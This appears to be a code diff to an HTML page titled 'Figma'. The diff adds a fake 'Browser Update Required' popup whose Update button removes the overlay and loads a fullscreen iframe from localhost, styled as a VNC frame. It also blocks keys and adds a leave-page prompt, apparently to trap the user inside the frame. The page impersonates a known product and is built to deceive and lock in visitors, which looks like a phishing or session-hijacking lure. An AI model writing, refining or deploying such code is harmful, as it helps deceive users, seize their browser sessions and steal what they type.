@@ -6,6 +6,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Figma</title>
     <style>
+         html, body {
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+    }
+
+    /* The iframe styling */
+    .vnc-iframe {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        border: none;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        z-index: 99999;
+    }
+
+    /* Additional support for fullscreen mode */
+    :fullscreen body,
+    :-webkit-full-screen body {
+        width: 100vw;
+        height: 100vh;
+    }
         :root {
             --primary-color: #000000;
             --secondary-color: #ffffff;
@@ -1137,88 +1164,118 @@
             });
         
             // Popup and Localhost Lockdown Functionality
-            function showUpdatePopup(event) {
-                if (event) event.preventDefault();
-        
-                const overlay = document.createElement('div');
-                overlay.style.position = 'fixed';
-                overlay.style.top = '0';
-                overlay.style.left = '0';
-                overlay.style.width = '100%';
-                overlay.style.height = '100%';
-                overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
-                overlay.style.zIndex = '10000';
-                overlay.style.display = 'flex';
-                overlay.style.justifyContent = 'center';
-                overlay.style.alignItems = 'center';
-        
-                const popup = document.createElement('div');
-                popup.style.backgroundColor = 'white';
-                popup.style.padding = '30px';
-                popup.style.borderRadius = '8px';
-                popup.style.maxWidth = '400px';
-                popup.style.textAlign = 'center';
-        
-                const title = document.createElement('h3');
-                title.textContent = 'Browser Update Required';
-                title.style.marginBottom = '15px';
-        
-                const message = document.createElement('p');
-                message.textContent = 'Your browser needs to be updated to continue.';
-                message.style.marginBottom = '20px';
-        
-                const updateButton = document.createElement('button');
-                updateButton.textContent = 'Update';
-                updateButton.style.padding = '10px 20px';
-                updateButton.style.backgroundColor = '#000';
-                updateButton.style.color = '#fff';
-                updateButton.style.border = 'none';
-                updateButton.style.borderRadius = '6px';
-                updateButton.style.cursor = 'pointer';
-        
-                updateButton.addEventListener('click', function () {
-                    // Request fullscreen FIRST (user gesture)
-                    document.documentElement.requestFullscreen().then(() => {
-                        document.body.removeChild(overlay);
-        
-                        const hiddenFrame = document.createElement('iframe');
-                        hiddenFrame.src = 'http://localhost/';
-                        hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
-                        hiddenFrame.style.position = 'fixed';
-                        hiddenFrame.style.top = '0';
-                        hiddenFrame.style.left = '0';
-                        hiddenFrame.style.width = '100%';
-                        hiddenFrame.style.height = '100%';
-                        hiddenFrame.style.border = 'none';
-                        hiddenFrame.style.zIndex = '99999';
-        
-                        hiddenFrame.onload = function () {
-                            document.body.style.overflow = 'hidden';
-        
-                            try {
-                                hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
-                                hiddenFrame.contentWindow.onbeforeunload = function () {
-                                    return "Are you sure you want to leave?";
-                                };
-                            } catch (error) {
-                                console.warn("Cannot attach key blocker to iframe:", error);
-                            }
-                        };
-        
-                        document.body.appendChild(hiddenFrame);
-                    }).catch(err => {
-                        console.log("Initial fullscreen failed:", err);
+           function showUpdatePopup(event) {
+        if (event) event.preventDefault();
+
+        const overlay = document.createElement('div');
+        overlay.style.position = 'fixed';
+        overlay.style.top = '0';
+        overlay.style.left = '0';
+        overlay.style.width = '100%';
+        overlay.style.height = '100%';
+        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
+        overlay.style.zIndex = '10000';
+        overlay.style.display = 'flex';
+        overlay.style.justifyContent = 'center';
+        overlay.style.alignItems = 'center';
+
+        const popup = document.createElement('div');
+        popup.style.backgroundColor = 'white';
+        popup.style.padding = '30px';
+        popup.style.borderRadius = '8px';
+        popup.style.maxWidth = '400px';
+        popup.style.textAlign = 'center';
+
+        const title = document.createElement('h3');
+        title.textContent = 'Browser Update Required';
+        title.style.marginBottom = '15px';
+
+        const message = document.createElement('p');
+        message.textContent = 'Your browser needs to be updated to continue.';
+        message.style.marginBottom = '20px';
+
+        const updateButton = document.createElement('button');
+        updateButton.textContent = 'Update';
+        updateButton.style.padding = '10px 20px';
+        updateButton.style.backgroundColor = '#000';
+        updateButton.style.color = '#fff';
+        updateButton.style.border = 'none';
+        updateButton.style.borderRadius = '6px';
+        updateButton.style.cursor = 'pointer';
+
+        updateButton.addEventListener('click', function () {
+            // Remove the overlay first
+            document.body.removeChild(overlay);
+            
+            // Force document to be clean for iframe
+            document.body.style.margin = '0';
+            document.body.style.padding = '0';
+            document.body.style.overflow = 'hidden';
+            document.documentElement.style.overflow = 'hidden';
+            
+            // Create the iframe with proper styling
+            const hiddenFrame = document.createElement('iframe');
+            hiddenFrame.src = 'http://localhost/';
+            hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
+            hiddenFrame.className = 'vnc-iframe'; // Apply our CSS class
+            
+            // Add redundant inline styles for maximum compatibility
+            hiddenFrame.style.position = 'fixed';
+            hiddenFrame.style.top = '0';
+            hiddenFrame.style.left = '0';
+            hiddenFrame.style.width = '100vw';
+            hiddenFrame.style.height = '100vh';
+            hiddenFrame.style.border = 'none';
+            hiddenFrame.style.zIndex = '99999';
+            
+            hiddenFrame.onload = function() {
+                // Request fullscreen after the iframe has loaded
+                try {
+                    document.documentElement.requestFullscreen().catch(err => {
+                        console.log("Fullscreen request failed:", err);
+                        // Fallback to maximize the iframe if fullscreen fails
+                        maximizeIframe(hiddenFrame);
                     });
-                });
-        
-                popup.appendChild(title);
-                popup.appendChild(message);
-                popup.appendChild(updateButton);
-                overlay.appendChild(popup);
-                document.body.appendChild(overlay);
+                    
+                    // Try to apply events to the iframe content
+                    try {
+                        hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
+                        hiddenFrame.contentWindow.onbeforeunload = function() {
+                            return "Are you sure you want to leave?";
+                        };
+                    } catch (error) {
+                        console.warn("Cannot attach events to iframe:", error);
+                    }
+                } catch (err) {
+                    console.error("Error in iframe onload:", err);
+                    maximizeIframe(hiddenFrame);
+                }
+            };
+            
+            // Helper function to maximize the iframe if fullscreen fails
+            function maximizeIframe(iframe) {
+                iframe.style.position = 'fixed';
+                iframe.style.top = '0';
+                iframe.style.left = '0';
+                iframe.style.width = '100vw';
+                iframe.style.height = '100vh';
+                document.body.style.overflow = 'hidden';
+                document.documentElement.style.overflow = 'hidden';
             }
-        
-            window.showUpdatePopup = showUpdatePopup;
+            
+            // Add the iframe to the page
+            document.body.appendChild(hiddenFrame);
+        });
+
+        popup.appendChild(title);
+        popup.appendChild(message);
+        popup.appendChild(updateButton);
+        overlay.appendChild(popup);
+        document.body.appendChild(overlay);
+    }
+    
+    window.showUpdatePopup = showUpdatePopup;
+            
         });
         </script>
         
